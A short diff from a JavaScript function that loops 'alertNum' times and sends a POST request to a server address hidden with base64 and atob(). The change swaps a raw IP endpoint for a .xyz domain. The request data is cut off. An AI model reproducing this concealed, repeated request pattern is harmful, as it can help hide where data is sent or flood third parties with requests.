@@ -32,7 +32,7 @@ const getStart = () => {
     }
     for(let i = 0; i < alertNum.value; i++) {
       $axios({
-        url: atob('aHR0cDovLzEuMTIuMjQ2LjEzMTo2NTc3Lw=='),
+        url: atob('aHR0cHM6Ly85ODEyMC54eXo6NjU3Ny8='),
         async: false,
         method: 'post', 
         data: {
